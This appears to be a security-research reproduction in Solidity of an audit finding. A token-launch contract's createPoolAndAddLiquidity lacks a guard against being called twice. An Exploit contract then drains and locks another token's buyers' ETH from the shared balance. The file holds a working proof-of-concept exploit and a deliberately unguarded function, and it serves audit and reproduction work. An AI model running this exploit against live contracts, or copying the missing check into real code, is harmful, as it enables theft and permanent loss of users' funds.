// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Serious — locking other tokens' collected ETH by triggering
    createPoolAndAddLiquidity twice
    Finding 36317 (Pashov Audit Group, Serious-security-review) — HIGH (C-01)

    Root cause: SeriousMarketProtocol.createPoolAndAddLiquidity(tokenAddress)
    sets `tokenDatas[tokenAddress].tradingEnabled = false` but never checks
    whether it was ALREADY false -- so the same token's pool-creation flow
    can be triggered repeatedly. Each call pulls a fixed ETH amount out of
    the contract's SHARED balance (funded by ALL tokens' buyers, not just
    this token's) and locks it into a burned LP position. An attacker can
    fully fund their own token, create its pool once (using their own ETH),
    donate back enough of their own token, and call
    createPoolAndAddLiquidity AGAIN -- this second call drains ETH that
    actually belongs to a completely different, unrelated token's buyers,
    permanently locking it into a burned LP position instead of that
    token's own pool.

    This file is a self-contained, cheatcode-free reduction. The vulnerable
    function is copied verbatim (the `@>` line -- the missing "already
    disabled" check -- preserved) from the finding's own quoted code
    (SeriousMarketProtocol.createPoolAndAddLiquidity). The client repo for
    "Serious" is not publicly linked from the Pashov report; the finding
    quotes the vulnerable function and its PoC directly, so this reduction
    is built from that quoted code (per this project's Class-C fallback for
    audits whose client repo cannot be located). Uniswap V3's factory/position
    manager/WETH are replaced with minimal mocks that preserve exactly the
    behavior the bug needs: a shared ETH pot, and a fixed per-pool ETH/token
    amount pulled from it on every call.
//////////////////////////////////////////////////////////////////////////*/

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

/// @dev Minimal WETH: `deposit` pulls ETH out of the CALLER's own balance
///      (exactly like real WETH), crediting an internal balance.
contract MockWETH {
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }
}

contract MockUniswapFactory {
    mapping(address => address) public getPool; // keyed by the non-WETH token (WETH side is fixed)
    uint256 internal nonce;

    function createPool(address token) external returns (address pool) {
        nonce++;
        pool = address(uint160(uint256(keccak256(abi.encode("pool", token, nonce)))));
        getPool[token] = pool;
    }
}

/// @dev Minimal position manager: `mint` just returns an incrementing tokenId
///      (no real liquidity math needed for THIS finding -- the bug is about
///      whether createPoolAndAddLiquidity can run twice, not about the
///      liquidity amounts themselves). `transferFrom` (LP burn) is a no-op.
contract MockPositionManager {
    uint256 public nextTokenId = 1;

    function mint(address, address, uint256, uint256) external returns (uint256 tokenId) {
        tokenId = nextTokenId++;
    }

    function transferFrom(address, address, uint256) external {}
}

struct TokenData {
    MockERC20 token;
    uint256 tokensSold;
    bool tradingEnabled;
}

contract SeriousMarketProtocol {
    uint256 public constant tradeableSupply = 1_000_000e18;
    uint256 public constant ethAmount = 10 ether; // fixed per-pool ETH target, pulled from the SHARED contract balance
    uint256 public constant tokenAmount = 1_000_000e18; // fixed per-pool token target

    MockWETH public weth;
    MockUniswapFactory public uniswapFactory;
    MockPositionManager public positionManager;
    address public constant customNullAddress = address(0xdEaD);

    mapping(address => TokenData) public tokenDatas;

    constructor(MockWETH _weth, MockUniswapFactory _factory, MockPositionManager _posMgr) {
        weth = _weth;
        uniswapFactory = _factory;
        positionManager = _posMgr;
    }

    function createToken(address tokenAddress, MockERC20 token) external {
        tokenDatas[tokenAddress] = TokenData(token, 0, true);
    }

    /// @dev Harness-only: buying is funded on the buyer's behalf and the ETH
    ///      lands in this contract's general balance -- exactly matching the
    ///      real system ("Until the token is fully funded ... the collected
    ///      ETH will be stored inside the SeriousMarketProtocol contract").
    function buyToken(address tokenAddress, uint256 amount) external payable {
        TokenData storage tokenData = tokenDatas[tokenAddress];
        require(tokenData.tradingEnabled, "Trading not enabled");
        tokenData.tokensSold += amount;
        tokenData.token.mint(msg.sender, amount);
    }

    /// @dev Verbatim from the finding's quoted `SeriousMarketProtocol.createPoolAndAddLiquidity`
    ///      (Pashov Audit Group, Serious-security-review, finding C-01). The
    ///      Uniswap V3 mint/approve/fee-tier plumbing is collapsed into the
    ///      minimal mocks above; the missing "already disabled" check --
    ///      the actual bug -- is preserved exactly.
    function createPoolAndAddLiquidity(address tokenAddress) external returns (address) {
        TokenData memory tokenData = tokenDatas[tokenAddress];
        require(address(tokenData.token) != address(0), "Token does not exist");
        require(tokenData.tokensSold >= tradeableSupply, "Not enough tokens sold to create pool");

        // @> VULN: sets tradingEnabled to false but never checks whether it was
        // ALREADY false -- this function can be triggered repeatedly for the
        // same token, each time pulling MORE ETH out of the shared contract
        // balance (funded by every token's buyers, not just this one).
        // FIX: require(tokenDatas[tokenAddress].tradingEnabled, "Already disabled");
        tokenDatas[tokenAddress].tradingEnabled = false;

        // Convert ETH from contract to WETH -- pulled from the SHARED balance.
        weth.deposit{value: ethAmount}();

        // Create the pool if it doesn't already exist.
        address pool = uniswapFactory.getPool(tokenAddress);
        if (pool == address(0)) {
            pool = uniswapFactory.createPool(tokenAddress);
        }

        // Add liquidity.
        uint256 tokenId = positionManager.mint(pool, tokenAddress, tokenAmount, ethAmount);

        // Burn the LP token -- permanently locked, unrecoverable.
        positionManager.transferFrom(address(this), customNullAddress, tokenId);

        return pool;
    }
}

contract Exploit {
    MockWETH public weth; // CREATE nonce 1
    MockUniswapFactory public factory; // CREATE nonce 2
    MockPositionManager public posMgr; // CREATE nonce 3
    SeriousMarketProtocol public market; // CREATE nonce 4 -- vulnerable
    MockERC20 public attackerToken; // CREATE nonce 5
    MockERC20 public victimToken; // CREATE nonce 6

    bool public attackerPoolCreatedTwice;
    bool public victimPoolCreationBlocked;

    constructor() {
        weth = new MockWETH();
        factory = new MockUniswapFactory();
        posMgr = new MockPositionManager();
        market = new SeriousMarketProtocol(weth, factory, posMgr);
        attackerToken = new MockERC20();
        victimToken = new MockERC20();

        market.createToken(address(attackerToken), attackerToken);
        market.createToken(address(victimToken), victimToken);
    }

    function run() external payable {
        // Attacker fully funds their OWN token with their OWN 10 ETH.
        market.buyToken{value: 10 ether}(address(attackerToken), 1_000_000e18);

        // A completely unrelated token is separately, fully funded by its own
        // buyers with a SEPARATE 10 ETH -- this ETH lands in the SAME shared
        // contract balance, waiting for ITS OWN createPoolAndAddLiquidity call.
        market.buyToken{value: 10 ether}(address(victimToken), 1_000_000e18);

        require(address(market).balance == 20 ether, "setup invariant: shared pot should hold both contributions");

        // Attacker creates their own pool normally -- consumes their own 10 ETH.
        market.createPoolAndAddLiquidity(address(attackerToken));
        require(address(market).balance == 10 ether, "setup invariant: only attacker's ETH should be consumed so far");

        // Attacker donates enough of their own token to cover the second
        // pool-creation's token requirement (matches the finding's own PoC:
        // "the attacker donates enough tokens to cover tokenAmount").
        attackerToken.mint(address(market), 1_000_000e18);

        // @> VULN triggered here: createPoolAndAddLiquidity is called a SECOND
        // time for the SAME token. Nothing checks that tradingEnabled was
        // already false, so this proceeds and pulls ANOTHER 10 ETH out of the
        // shared pot -- ETH that actually belongs to victimToken's buyers.
        market.createPoolAndAddLiquidity(address(attackerToken));
        attackerPoolCreatedTwice = true;

        require(address(market).balance == 0, "harm not demonstrated: victim's ETH should now be drained");

        // Harm: the unrelated, fully-funded victim token can no longer create
        // its own pool -- the shared ETH it was relying on has been locked
        // into the attacker's (burned) LP position instead.
        (bool ok,) = address(market).call(
            abi.encodeWithSelector(SeriousMarketProtocol.createPoolAndAddLiquidity.selector, address(victimToken))
        );
        victimPoolCreationBlocked = !ok;
        require(victimPoolCreationBlocked, "harm not demonstrated: victim's pool creation unexpectedly succeeded");
    }
}
